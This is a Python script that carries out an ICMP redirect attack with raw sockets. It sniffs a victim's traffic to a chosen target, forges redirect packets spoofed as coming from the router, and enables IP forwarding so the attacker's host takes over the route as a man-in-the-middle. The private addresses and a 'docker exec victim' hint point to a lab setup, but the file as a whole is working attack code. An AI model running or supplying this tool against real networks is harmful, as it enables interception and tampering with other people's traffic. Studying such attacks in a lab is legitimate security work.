#!/usr/bin/env python3
"""
ICMP Redirect Attack - Raw Socket Implementation
This script implements an ICMP Redirect attack without using external libraries like Scapy.
It sniffs for victim traffic and sends ICMP redirect messages to poison the victim's routing table.
"""

import socket
import struct
import atexit
import time
import sys

# ─── CONFIG ─────────────────────────────────────────────────────────────────────
VICTIM_IP = "10.10.1.10"     # Victim's IP
ROUTER_IP = "10.10.1.1"      # Router's IP 
ATTACKER_IP = "10.10.1.20"   # Attacker's IP (us)
TARGET_IP = "10.10.2.10"     # Target's IP on the other network
IFACE = "eth0"               # Interface to sniff on

# ─── PACKET CRAFTING ─────────────────────────────────────────────────────────────
def checksum(data: bytes) -> int:
    """Compute Internet checksum for the data"""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_ip_header(src_ip, dst_ip, proto, payload_len, ttl=64):
    """Create an IP header"""
    # IP header fields
    ip_ver_ihl = (4 << 4) | 5  # Version 4, IHL 5 words (20 bytes)
    ip_tos = 0  # Type of Service
    ip_tot_len = 20 + payload_len  # Total length (header + payload)
    ip_id = 0xabcd  # Identification
    ip_frag_off = 0  # Fragment offset
    ip_ttl = ttl  # Time to Live
    ip_proto = proto  # Protocol
    ip_check = 0  # Checksum (calculated later)
    ip_saddr = socket.inet_aton(src_ip)  # Source address
    ip_daddr = socket.inet_aton(dst_ip)  # Destination address

    # Pack the IP header
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr
    )

    # Calculate and update the checksum
    ip_check = checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack('!H', ip_check) + ip_header[12:]

    return ip_header

def create_icmp_redirect(gateway_ip, orig_packet):
    """Create an ICMP redirect message"""
    icmp_type = 5  # Redirect
    icmp_code = 1  # Redirect for host
    icmp_check = 0  # Checksum (calculated later)
    gateway = socket.inet_aton(gateway_ip)  # New gateway address
    
    # Per RFC 792, ICMP redirect contains the IP header + first 8 bytes of original datagram
    original_data = orig_packet[:28]  # IP header (20 bytes) + first 8 bytes of data
    
    # Create the ICMP header
    icmp_header = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway)
    
    # Combine with original data
    icmp_packet = icmp_header + original_data
    
    # Calculate and update the checksum
    icmp_check = checksum(icmp_packet)
    icmp_packet = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway) + original_data
    
    return icmp_packet

# ─── PACKET SNIFFING ─────────────────────────────────────────────────────────────
def setup_raw_socket():
    """Create a raw socket for packet sniffing"""
    try:
        # Create a raw socket to capture all IP packets
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
        s.bind((IFACE, 0))
        return s
    except socket.error as e:
        print(f"Error creating socket: {e}")
        sys.exit(1)

def extract_ip_packet(packet):
    """Extract the IP packet from Ethernet frame"""
    # Skip the Ethernet header (14 bytes)
    ip_packet = packet[14:]
    return ip_packet

def parse_ip_header(ip_packet):
    """Parse IP header fields"""
    if len(ip_packet) < 20:
        return None
        
    # Unpack IP header
    iph = struct.unpack('!BBHHHBBH4s4s', ip_packet[:20])
    
    version_ihl = iph[0]
    version = version_ihl >> 4
    ihl = version_ihl & 0xF
    
    protocol = iph[6]
    src_addr = socket.inet_ntoa(iph[8])
    dst_addr = socket.inet_ntoa(iph[9])
    
    return {
        'version': version,
        'header_length': ihl * 4,
        'protocol': protocol,
        'src': src_addr,
        'dst': dst_addr,
        'raw': ip_packet[:20]
    }

# ─── ATTACK FUNCTIONS ─────────────────────────────────────────────────────────────
def send_icmp_redirect(victim_packet):
    """Send ICMP redirect to the victim"""
    # Create the IP header (router -> victim)
    ip_hdr = create_ip_header(
        src_ip=ROUTER_IP,       # Spoof as router
        dst_ip=VICTIM_IP,       # Send to victim
        proto=1,                # ICMP
        payload_len=8 + 28      # ICMP header + original data
    )
    
    # Create the ICMP redirect message
    icmp_redirect = create_icmp_redirect(
        gateway_ip=ATTACKER_IP,   # Redirect to us
        orig_packet=victim_packet # Original packet
    )
    
    # Combine the packet
    packet = ip_hdr + icmp_redirect
    
    # Send the packet
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.sendto(packet, (VICTIM_IP, 0))
    
    print(f"✅ Sent ICMP redirect to {VICTIM_IP}")
    print(f"   Redirecting traffic for {TARGET_IP} to {ATTACKER_IP}")

def process_packet(packet):
    """Process a captured packet and send redirect if it's from victim to target"""
    # Extract and parse IP header
    ip_packet = extract_ip_packet(packet)
    if not ip_packet:
        return
        
    ip_header = parse_ip_header(ip_packet)
    if not ip_header:
        return
    
    # Check if this is traffic from victim to target
    if (ip_header['src'] == VICTIM_IP and ip_header['dst'] == TARGET_IP):
        print(f"🔍 Detected victim traffic: {VICTIM_IP} -> {TARGET_IP}")
        send_icmp_redirect(ip_packet)

def setup_ip_forwarding():
    """Enable IP forwarding to allow traffic to flow through attacker"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("✅ Enabled IP forwarding")

def cleanup():
    """Cleanup function called on exit"""
    print("\n🧹 Cleaning up...")
    print("⚠️  Remember to check victim's routing table for redirected routes")
    print("   Run: docker exec victim ip route")

# ─── MAIN FUNCTION ─────────────────────────────────────────────────────────────────
def main():
    """Main function"""
    print("🚀 ICMP Redirect Attack")
    print("======================================")
    print(f"Victim: {VICTIM_IP}")
    print(f"Router: {ROUTER_IP}")
    print(f"Attacker: {ATTACKER_IP}")
    print(f"Target: {TARGET_IP}")
    print("======================================")
    
    # Register cleanup
    atexit.register(cleanup)
    
    # Enable IP forwarding
    setup_ip_forwarding()
    
    # Create a raw socket
    print(f"📡 Sniffing for victim traffic on {IFACE}...")
    print("Press Ctrl+C to stop")
    
    raw_socket = setup_raw_socket()
    
    try:
        while True:
            # Receive packet
            packet = raw_socket.recv(65565)
            process_packet(packet)
            
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped by user")
        sys.exit(0)

if __name__ == "__main__":
    main()
